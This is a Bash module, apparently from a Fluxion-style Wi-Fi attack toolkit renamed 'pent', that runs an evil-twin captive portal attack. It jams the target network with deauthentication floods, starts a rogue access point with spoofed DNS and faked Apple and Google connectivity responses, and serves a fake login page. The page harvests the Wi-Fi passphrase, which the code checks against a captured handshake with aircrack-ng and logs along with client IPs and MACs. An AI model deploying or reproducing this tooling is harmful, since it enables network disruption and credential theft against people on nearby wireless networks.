...
CaptivePortalPassLog="$PENTPath/attacks/Captive Portal/pwdlog"
CaptivePortalNetLog="$PENTPath/attacks/Captive Portal/netlog"
...
captive_portal_set_jammer_interface() {
  ...
  if [ ! "$CaptivePortalJammerInterfaceOriginal" ]; then
    echo "Running get jammer interface." > $PENTOutputDevice
    if ! pent_get_interface attack_targetting_interfaces \
      "$CaptivePortalJammerInterfaceQuery"; then
      echo "Failed to get jammer interface" > $PENTOutputDevice
      return 1
    fi
    CaptivePortalJammerInterfaceOriginal=$PentInterfaceSelected
  fi

  local selectedInterface=$CaptivePortalJammerInterfaceOriginal

  if ! pent_allocate_interface $selectedInterface; then
    echo "Failed to allocate jammer interface" > $PENTOutputDevice
    return 2
  fi

  echo "Succeeded get jammer interface." > $PENTOutputDevice
  CaptivePortalJammerInterface=${PentInterfaces[$selectedInterface]}
}
...
captive_portal_unset_ap_interface() {
  ...
  if [ "$CaptivePortalAccessPointInterface" = \
    ...
    if ! iw dev $CaptivePortalAccessPointInterface del \
      &> $PENTOutputDevice; then
      pent_conditional_bail "Unable to remove virtual interface!"
      exit 1
    fi
  fi
...
captive_portal_set_ap_interface() {
  ...
  if [ ! "$CaptivePortalAccessPointInterfaceOriginal" ]; then
    echo "Running get ap interface." > $PENTOutputDevice
    if ! pent_get_interface captive_portal_ap_interfaces \
      "$CaptivePortalAccessPointInterfaceQuery"; then
      echo "Failed to get ap interface" > $PENTOutputDevice
      return 1
    fi
    CaptivePortalAccessPointInterfaceOriginal=$PentInterfaceSelected
  fi

  local selectedInterface=$CaptivePortalAccessPointInterfaceOriginal

  if ! pent_allocate_interface $selectedInterface; then
    echo "Failed to allocate ap interface" > $PENTOutputDevice
    return 2
  fi

  echo "Succeeded get ap interface." > $PENTOutputDevice
  CaptivePortalAccessPointInterface=${PentInterfaces[$selectedInterface]}

  # If interfaces are the same, we need an independent virtual interface.
  if [ "$CaptivePortalAccessPointInterface" = \
    "$CaptivePortalJammerInterface" ]; then
    # TODO: Make pent's interface services manage virtual interfaces.
    # Have pent_get_interface return a virutal interface if the primary
    # interface is in used by something else (virtual reservation?).
    echo "Virtual interface required, attempting." > $PENTOutputDevice
    if ! iw dev $CaptivePortalJammerInterface interface \
      add ${CaptivePortalJammerInterface}v type managed \
      2> $PENTOutputDevice; then
      echo -e "$PENTVLine $CaptivePortalCannotStartInterfaceError"
      sleep 5
      return 2
    fi
    echo "Virtual interface created successfully." > $PENTOutputDevice
...
function captive_portal_set_ap_service() {
  if [ "$CaptivePortalAPService" ]; then
    if ! type -t ap_service_start; then
      ...
      source "$PENTLibPath/ap/$CaptivePortalAPService.sh"
    fi
    return 0
  fi
  if ! interface_is_wireless "$CaptivePortalAccessPointInterface"; then
...
echo -e "$PENTVLine ${CClr}Select a method of deauthentication\n${CClr}"
...
read -p $'\e[0;31m[\e[1;34mpent\e[1;33m@\e[1;37m'"$HOSTNAME"$'\e[0;31m]\e[0;31m-\e[0;31m[\e[1;33m~\e[0;31m] \e[0m' option_deauth
  ...
  if [ "$PENTAuto" ]; then
    ...
    echo -e "$PENTVLine $CaptivePortalAPServiceQuery"
    echo
    ...
    case "$IOQueryChoice" in
      ...
      "$PENTGeneralBackOption")
        ...
        ;;
    *)
      pent_conditional_bail "Invalid AP service selected!"
      return 1
      ;;
    esac
  fi
...
captive_portal_unset_authenticator() {
  ...
  case "$CaptivePortalAuthenticatorMode" in
    "hash"*)
      echo "Unset hash is done automatically." > $PENTOutputDevice ;;
  esac
...
captive_portal_set_authenticator() {
  ...
  echo -e "$PENTVLine $CaptivePortalVerificationMethodQuery"
  echo
  ...
  case "$CaptivePortalAuthenticatorMode" in
    "hash"*)
      ...
      if [ ! "$CaptivePortalHashPath" ]; then
        CaptivePortalHashPath="$PENTPath/attacks/Handshake Snooper/handshakes/$PentTargetSSIDClean-$PentTargetMAC.cap"
      fi

      pent_hash_get_path \
        "$CaptivePortalHashPath" "$PentTargetMAC" "$PentTargetSSID"
      result=$?

      CaptivePortalHashPath="${PentHashPath:-'INVALID_PATH'}"

      if [ $result -ne 0 ]; then
        echo "Failed to set a hash path!" > $PENTOutputDevice
      fi
      ;;
  esac
  ...
  if [ $result -ne 0 ]; then
    echo "Auth-mode error code $result!" > $PENTOutputDevice
    return 1
  fi
}
...
captive_portal_run_certificate_generator() {
  xterm -bg "#000000" -fg "#CCCCCC" \
    ...
    -keyout "$PENTWorkspacePath/server.pem" \
    -out "$PENTWorkspacePath/server.pem"
    # Details -> https://www.openssl.org/docs/manmaster/apps/openssl.html
  chmod 400 "$PENTWorkspacePath/server.pem"
}
...
captive_portal_unset_certificate() {
  ...
  sandbox_remove_workfile "$PENTWorkspacePath/server.pem"
  CaptivePortalSSL=""
...
captive_portal_set_certificate() {
  if [ \
      ...
      -f "$PENTWorkspacePath/server.pem" ]; then
  ...
  # Check existance of ssl certificate within pent with file size > 0
  # If user-supplied (fancy) certificate exists, copy it to fluxspace.
  if [ \
    -f "$PENTPath/attacks/Captive Portal/certificate/server.pem" -a \
    -s "$PENTPath/attacks/Captive Portal/certificate/server.pem" \
    ]; then
    cp "$PENTPath/attacks/Captive Portal/certificate/server.pem" \
      "$PENTWorkspacePath/server.pem"
  ...
  if [ "$restoring" ]; then
    if ! captive_portal_run_certificate_generator; then
      pent_conditional_bail "cert-gen failed!"
      return 2
    fi
  ...
  if [ "$PENTAuto" ]; then
    ...
    case "$IOQueryChoice" in
      ...
      "$PENTGeneralBackOption")
        ...
        ;;
      *)
        pent_conditional_bail "Unknown cert-gen option!"
        return 2
        ;;
    esac
  fi
  ...
  if [ "$PENTAuto" ]; then
    ...
    case "$IOQueryChoice" in
      ...
      "$PENTGeneralBackOption")
        ...
        ;;
      *)
        pent_conditional_bail "Unknown connectivity option!"
        return 2
        ;;
    esac
  fi
...
captive_portal_set_user_interface() {
  local -r attackPath="$PENTPath/attacks/Captive Portal"
  ...
  if [ -d "$PENTPath/attacks/Captive Portal/generic/languages" ]; then
    # Normalize the names of the generic portals for presentation.
    for site in "$PENTPath/attacks/Captive Portal/generic/languages/"*.lang; do
      sites+=("${CaptivePortalGenericInterfaceOption}_$(basename "${site%.lang}")")
    done
  fi

  # Attempt adding custom portals only if the directory exists.
  if [ -d "$PENTPath/attacks/Captive Portal/sites" ]; then
    # Retrieve available portal sites and strip the .portal extension.
    for site in "$PENTPath/attacks/Captive Portal/sites/"*.portal; do
      sites+=("$(basename "${site%.portal}")")
    done
  fi

  local sitesIdentifier=("${sites[@]/_*/}" "$PENTGeneralBackOption")
  ...
  echo -e "$PENTVLine $CaptivePortalUIQuery"

  echo

  pent_target_show "$PentTargetSSID" "$PentTargetEncryption" \
    "$PentTargetChannel" "$PentTargetMAC" "$PentTargetMaker"
  ...
  case "$site" in
    ...
    #  source "$PENTPath/attacks/Captive Portal/generic/languages/$siteLanguage.lang"
...
captive_portal_get_client_IP() {
  if [ -f "$CaptivePortalPassLog/$PentTargetSSIDClean-$PentTargetMAC-IP.log" ]; then
    MatchedClientIP=$(
      cat "$CaptivePortalPassLog/$PentTargetSSIDClean-$PentTargetMAC-IP.log" | \
...
captive_portal_get_IP_MAC() {
  if [ -f "$CaptivePortalPassLog/$PentTargetSSIDClean-$PentTargetMAC-IP.log" ] && \
    [ "$(captive_portal_get_client_IP)" != "" ] && \
    [ -f "$PENTWorkspacePath/clients.txt" ]; then
    local IP=$(captive_portal_get_client_IP)
    local MatchedClientMAC=$(
      cat $PENTWorkspacePath/clients.txt | \
...
captive_portal_unset_attack() {
  sandbox_remove_workfile \
    "$PENTWorkspacePath/captive_portal_authenticator.sh"
  sandbox_remove_workfile \
    "$PENTWorkspacePath/pent_captive_portal_dns.py"
  sandbox_remove_workfile "$PENTWorkspacePath/lighttpd.conf"
  sandbox_remove_workfile "$PENTWorkspacePath/dhcpd.leases"
  sandbox_remove_workfile "$PENTWorkspacePath/captive_portal/check.php"
  sandbox_remove_workfile "$PENTWorkspacePath/captive_portal"
...
captive_portal_set_attack() {
  ...
  if [ -d "$attackPath/sites/$CaptivePortalUserInterface.portal" ]; then
    cp -r "$attackPath/sites/$CaptivePortalUserInterface.portal" \
      "$PENTWorkspacePath/captive_portal"
  ...
  find "$PENTWorkspacePath/captive_portal/" -type f -exec \
    sed -i -e 's/$APTargetSSID/'"${PentTargetSSID//\//\\\/}"'/g; s/$APTargetMAC/'"${PentTargetMAC//\//\\\/}"'/g; s/$APTargetChannel/'"${PentTargetChannel//\//\\\/}"'/g' {} \;
  ...
  for authenticatorFile in "${authenticatorFiles[@]}"; do
    cp "$PENTPath/attacks/Captive Portal/lib/$authenticatorFile" \
      "$PENTWorkspacePath/captive_portal/$authenticatorFile"
    sed -i -e 's/\$PENTWorkspacePath/'"${PENTWorkspacePath//\//\\\/}"'/g' \
      "$PENTWorkspacePath/captive_portal/$authenticatorFile"
    chmod u+x "$PENTWorkspacePath/captive_portal/$authenticatorFile"
  done

  # Add the files for captive portal internet connectivity checks.
  cp -r "$PENTPath/attacks/Captive Portal/lib/connectivity responses/" \
    "$PENTWorkspacePath/captive_portal/connectivity_responses"
...
" >"$PENTWorkspacePath/dhcpd.conf"

  #create an empty leases file
  touch "$PENTWorkspacePath/dhcpd.leases"

  # Generate configuration for a lighttpd web-server.
  echo "\
server.document-root = \"$PENTWorkspacePath/captive_portal/\"
...
accesslog.filename = \"$PENTWorkspacePath/lighttpd.log\"
...
" >"$PENTWorkspacePath/lighttpd.conf"

  # Configure lighttpd's SSL only if we've got a certificate and its key.
  if [ -f "$PENTWorkspacePath/server.pem" -a -s "$PENTWorkspacePath/server.pem" ]; then
    echo "\
\$SERVER[\"socket\"] == \":443\" {
    ssl.engine = \"enable\"
    ssl.pemfile = \"$PENTWorkspacePath/server.pem\"
}
" >>"$PENTWorkspacePath/lighttpd.conf"
  fi
...
\$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
    server.document-root = \"$PENTWorkspacePath/captive_portal/connectivity_responses/Apple/\"
}
...
\$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*|(alt[0-9]*-)?mtalk)\.google|connectivitycheck\.(android|gstatic))\.com\" {
    server.document-root = \"$PENTWorkspacePath/captive_portal/connectivity_responses/Google/\"
...
" >"$PENTWorkspacePath/hosts"

  #chmod +x "$PENTWorkspacePath/pent_captive_portal_dns.py"

  local -r targetSSIDCleanNormalized=${PentTargetSSIDClean//"/\\"}
...
echo > \"$PENTWorkspacePath/candidate.txt\"
echo -n \"0\"> \"$PENTWorkspacePath/hit.txt\"
...
while [ \$AuthenticatorState = \"running\" ]; do
    ...
    if [ -f \"$PENTWorkspacePath/pwdattempt.txt\" -a -s \"$PENTWorkspacePath/pwdattempt.txt\" ]; then
        # Save any new password attempt.
        cat \"$PENTWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$PentTargetMAC.log\"

        # Clear logged password attempt.
        echo -n > \"$PENTWorkspacePath/pwdattempt.txt\"
    fi

    if [ -f \"$PENTWorkspacePath/ip_hits\" -a -s \"$PENTWorkspacePath/ip_hits.txt\" ]; then
        cat \"$PENTWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$PentTargetMAC-IP.log\"
        echo \" \" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$PentTargetMAC-IP.log\"
        echo -n > \"$PENTWorkspacePath/ip_hits\"
    fi
...
" >>"$PENTWorkspacePath/captive_portal_authenticator.sh"
  ...
  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
    case "$CaptivePortalAuthenticatorMode" in
      # Cowpatty
      "$CaptivePortalVerificationMethodCowpattyOption")
        local -r verifiedCondition="cowpatty -f \"$PENTWorkspacePath/candidate.txt\" -r \"$CaptivePortalHashPath\" -s \"$PentTargetSSID\" &> $PENTOutputDevice"
        ;;
      # Pyrit
      "$CaptivePortalVerificationMethodPyritOption")
        local -r verifiedCondition="pyrit -r \"$CaptivePortalHashPath\" -i \"$PENTWorkspacePath/candidate.txt\" -b $PentTargetMAC attack_passthrough &> $PENTOutputDevice"
        ;;
      ...
      *)
        ...
        local -r verifiedCondition="aircrack-ng -b $PentTargetMAC -w \"$PENTWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | egrep -qi \"Passphrase not in|KEY NOT FOUND\""
        ;;
    esac
    echo "
    if [ -f \"$PENTWorkspacePath/candidate_result.txt\" ]; then
        if $verifiedCondition; then
            echo \"2\" > \"$PENTWorkspacePath/candidate_result.txt\"
            sleep 1
            break
        else
            echo \"1\" > \"$PENTWorkspacePath/candidate_result.txt\"
        fi
    fi" >> "$PENTWorkspacePath/captive_portal_authenticator.sh"
  fi

  local -r staticSSID=$(printf "%q" "$PentTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
  echo "
    ...
    echo -e \"    MAC ............: $CYel$PentTargetMAC$CClr\"
    echo -e \"    Channel ........: $CWht$PentTargetChannel$CClr\"
    echo -e \"    Vendor .........: $CGrn${PentTargetMaker:-UNKNOWN}$CClr\"
    echo -e \"    Runtime ........: $CBlu\$ih\$h:\$im\$m:\$is\$s$CClr\"
    echo -e \"    Attempts .......: $CRed\$(cat $PENTWorkspacePath/hit.txt)$CClr\"
    echo -e \"    Clients ........: $CBlu\$(cat $PENTWorkspacePath/clients.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)$CClr\"
    echo
    ...
    for client in \"\${DHCPClients[@]}\"; do
        ...
        ClientHostname=\$(grep \$ClientIP \"$PENTWorkspacePath/clients.txt\" | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')

        echo -e \"    $CGrn \$x) $CRed\$ClientIP $CYel\$ClientMAC $CClr($CBlu\$ClientMID$CClr) $CGrn \$ClientHostname$CClr\"
    done

    echo -ne \"\033[K\033[u\"" >>"$PENTWorkspacePath/captive_portal_authenticator.sh"

  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
    echo "
    sleep 1" >>"$PENTWorkspacePath/captive_portal_authenticator.sh"
  fi
...
clear
echo \"1\" > \"$PENTWorkspacePath/status.txt\"
...
echo \"
PENT $PENTVersion.$PENTRevision

SSID: \\\"$staticSSID\\\"
BSSID: $PentTargetMAC ($PentTargetMaker)
Channel: $PentTargetChannel
Security: $PentTargetEncryption
Time: \$ih\$h:\$im\$m:\$is\$s
Password: \$(cat $PENTWorkspacePath/candidate.txt)
Mac: $(captive_portal_get_IP_MAC) ($(captive_portal_get_MAC_brand))
IP: $(captive_portal_get_client_IP)
\" >\"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$PentTargetMAC.log\"" >>"$PENTWorkspacePath/captive_portal_authenticator.sh"

  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
#    echo "
# aircrack-ng -a 2 -b $PentTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$PENTWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$PentTargetMAC.log"$CClr"\"\
#" >>"$PENTWorkspacePath/captive_portal_authenticator.sh"
    echo "
    echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$PentTargetMAC.log"$CClr"\"\
      " >>"$PENTWorkspacePath/captive_portal_authenticator.sh"
  fi

  chmod +x "$PENTWorkspacePath/captive_portal_authenticator.sh"
}

# Generate the contents for a generic web interface
captive_portal_generic() {
  if [ ! -d "$PENTWorkspacePath/captive_portal" ]; then
    mkdir "$PENTWorkspacePath/captive_portal"
  fi

  base64 -d "$PENTPath/attacks/Captive Portal/generic/assets" >"$PENTWorkspacePath/file.zip"

  unzip "$PENTWorkspacePath/file.zip" -d "$PENTWorkspacePath/captive_portal" &>$PENTOutputDevice
  sandbox_remove_workfile "$PENTWorkspacePath/file.zip"
...
</html>" >"$PENTWorkspacePath/captive_portal/final.html"
...
</html>" >"$PENTWorkspacePath/captive_portal/error.html"
                ...
                <fieldset>
                    <form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
                        ...
                        <div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
                            <div><u>$PentTargetSSID</u> ($PentTargetMAC)</div>
                            <!--<div>Channel: $PentTargetChannel</div>-->
                        </div>
...
</html>" >"$PENTWorkspacePath/captive_portal/index.html"

if [ $PENTEnable5GHZ -eq 1 ];then
    cp -r "$PENTPath/attacks/Captive Portal/deauth-ng.py" "$PENTWorkspacePath/captive_portal/deauth-ng.py"
    chmod +x "$PENTWorkspacePath/captive_portal/deauth-ng.py"
fi
...
captive_portal_unset_routes() {
  ...
  if [ -f "$PENTWorkspacePath/ip_forward" ]; then
    sysctl -w net.ipv4.ip_forward=$(
      cat "$PENTWorkspacePath/ip_forward"
    ) &> $PENTOutputDevice
    sandbox_remove_workfile "$PENTWorkspacePath/ip_forward"
  fi
...
captive_portal_set_routes() {
  ...
  cp "/proc/sys/net/ipv4/ip_forward" "$PENTWorkspacePath/ip_forward"

  # Activate system IPV4 packet routing/forwarding.
  sysctl -w net.ipv4.ip_forward=1 &>$PENTOutputDevice
...
captive_portal_start_interface() {
  if [ "$CaptivePortalAPService" ]; then
    echo -e "$PENTVLine $CaptivePortalStaringAPServiceNotice"
    ap_service_start
  else
    pent_header

    echo -e "$PENTVLine Configuration for external access point device:"
    echo

    pent_target_show

    echo -e "$PENTVLine IPv4 Address: ${CaptivePortalGatewayAddress%.*}.2/24"
    echo -e "$PENTVLine IPv6 Address: Disabled"
    echo -e "$PENTVLine  DHCP Server: $CaptivePortalGatewayAddress"
    echo -e "$PENTVLine   DNS Server: $CaptivePortalGatewayAddress"
    echo

    echo -e "$PENTVLine ${CYel}Assure external AP device is available & configured before continuing!${CClr}"
    read -n1 -p "Press any key to continue... " bullshit
  fi

  echo -e "$PENTVLine $CaptivePortalStaringAPRoutesNotice"
  captive_portal_set_routes &
  sleep 3

  fuser -n tcp -k 53 67 80 443 &> $PENTOutputDevice
  fuser -n udp -k 53 67 80 443 &> $PENTOutputDevice
}
...
if [ ! "$CaptivePortalCLIArguments" ]; then
  if ! CaptivePortalCLIArguments=$(
    getopt --options="a:j:s:c:u:h:n" \
      ...
      --name="Captive Portal V$PENTVersion.$PENTRevision" -- "$@"
    ); then
...
prep_attack() {
  ...
  if ! pent_do_sequence captive_portal sequence[@]; then
    return 1
  fi
...
load_attack() {
  ...
  # Assure hash is relevant for pent's current target.
  # If the hash is no longer relevant, clear to force reset.
  if [ \
    "$targetHashSSID" != "$PentTargetSSID" -o \
    "$targetHashMAC" != "$PentTargetMAC" ]; then
...
save_attack() {
  ...
  echo "$PentTargetSSID" >> "$configurationPath"
  echo "$PentTargetMAC" >> "$configurationPath"
  ...
  if [ "$CaptivePortalNetworkManagerShutoff" != "disabled" ]; then
    if [ -x "$(command -v systemctl)" ]; then
      if [ "$CaptivePortalDisabledNetworkManager" ]; then
        ...
        systemctl restart networkmanager.service &> $PENTOutputDevice
        systemctl restart networking.service &> $PENTOutputDevice

        # Reset disabled network-manager flag.
        CaptivePortalDisabledNetworkManager=""
      fi
      if [ "$CaptivePortalDisabledResolveD" ]; then
        systemctl restart systemd-resolved.service &> $PENTOutputDevice
      ...
      if [ "$CaptivePortalDisabledResolveD" ]; then
        service systemd-resolved restart &> $PENTOutputDevice
...
start_attack() {
  ...
  if [ "$CaptivePortalNetworkManagerShutoff" != "disabled" ]; then
    ...
    # Start the network-manager if it's disabled.
    if [ -x "$(command -v systemctl)" ]; then
      if systemctl status network-manager.service &> $PENTOutputDevice ||
         systemctl status networkmanager.service &> $PENTOutputDevice; then
        systemctl stop network-manager.service &> $PENTOutputDevice
        systemctl stop networkmanager.service &> $PENTOutputDevice
        CaptivePortalDisabledNetworkManager=1
      else
        echo "No network managers appear to be running." > $PENTOutputDevice
      fi
      if systemctl status systemd-resolved.service &> $PENTOutputDevice; then
        systemctl stop systemd-resolved.service &> $PENTOutputDevice
        CaptivePortalDisabledResolveD=1
      else
        echo "No DNS resolvers appear to be running." > $PENTOutputDevice
      fi
    elif [ -x "$(command -v service)" ]; then
      if service network-manager status &> $PENTOutputDevice ||
         service networkmanager status &> $PENTOutputDevice; then
        service network-manager stop &> $PENTOutputDevice
        service networkmanager stop &> $PENTOutputDevice
        CaptivePortalDisabledNetworkManager=1
      else
        echo "No network managers appear to be running." > $PENTOutputDevice
      fi
      if service systemd-resolved status &> $PENTOutputDevice; then
        service systemd-resolved stop &> $PENTOutputDevice
        CaptivePortalDisabledResolveD=1
      else
        echo "No DNS resolvers appear to be running." > $PENTOutputDevice
      fi
  ...
  echo -e "$PENTVLine $CaptivePortalStartingDHCPServiceNotice"
  xterm $PENTHoldXterm $TOPLEFT -bg black -fg "#CCCC00" \
    -title "Wifipot AP DHCP Service" -e \
    "dhcpd -d -f -lf \"$PENTWorkspacePath/dhcpd.leases\" -cf \"$PENTWorkspacePath/dhcpd.conf\" $CaptivePortalAccessInterface 2>&1 | tee -a \"$PENTWorkspacePath/clients.txt\"" &
  ...
  echo -e "$PENTVLine $CaptivePortalStartingDNSServiceNotice"
  xterm $PENTHoldXterm $BOTTOMLEFT -bg black -fg "#99CCFF" \
    -title "Wifipot AP DNS Service" -e \
    "dnsspoof -i ${CaptivePortalAccessInterface} -f \"$PENTWorkspacePath/hosts\"" &
  # Save parent's pid, to get to child later.
  CaptivePortalDNSServiceXtermPID=$!
  echo "DNS Service: $CaptivePortalDNSServiceXtermPID" \
    >> $PENTOutputDevice

  echo -e "$PENTVLine $CaptivePortalStartingWebServiceNotice"
  lighttpd -f "$PENTWorkspacePath/lighttpd.conf" \
    &> $PENTOutputDevice
  CaptivePortalWebServicePID=$!

  xterm $PENTHoldXterm $BOTTOM -bg black -fg "#00CC00" \
    -title "Wifipot Web Service" -e \
    "tail -f \"$PENTWorkspacePath/lighttpd.log\"" &
  CaptivePortalWebServiceXtermPID=$!
  echo "Web Service: $CaptivePortalWebServiceXtermPID" \
    >> $PENTOutputDevice

  echo -e "$PENTVLine $CaptivePortalStartingJammerServiceNotice"
  echo -e "$PentTargetMAC" >"$PENTWorkspacePath/mdk4_blacklist.lst"

  if [ $PENTEnable5GHZ -eq 1 ]; then
    xterm $PENTHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
        -title "Wifipot AP Jammer Service [$PentTargetSSID]" -e \
        "./$PENTWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $PentTargetChannel -a $PentTargetMAC" &
    # Save parent's pid, to get to child later.
	...
	xterm $PENTHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
        -title "Wifipot AP Jammer Service [$PentTargetSSID]" -e \
        "mdk4 $CaptivePortalJammerInterface d -c $PentTargetChannel -b \"$PENTWorkspacePath/mdk4_blacklist.lst\"" &
        # Save parent's pid, to get to child later.
    	CaptivePortalJammerServiceXtermPID=$!
	...
	xterm $PENTHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
        -title "Wifipot AP Jammer Service [$PentTargetSSID]" -e \
        "aireplay-ng -0 0 -a $PentTargetMAC --ignore-negative-one $CaptivePortalJammerInterface" &
        # Save parent's pid, to get to child later.
    	CaptivePortalJammerServiceXtermPID=$!
	...
	xterm $PENTHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
        -title "Wifipot AP Jammer Service [$PentTargetSSID]" -e \
        "mdk3 $CaptivePortalJammerInterface d -c $PentTargetChannel -b \"$PENTWorkspacePath/mdk4_blacklist.lst\"" &
        # Save parent's pid, to get to child later.
    	CaptivePortalJammerServiceXtermPID=$!
  fi
  ...
  echo -e "$PENTVLine $CaptivePortalStartingAuthenticatorServiceNotice"
  xterm -hold $TOPRIGHT -bg black -fg "#CCCCCC" \
    -title "Wifipot AP Authenticator" \
    -e "$PENTWorkspacePath/captive_portal_authenticator.sh" &
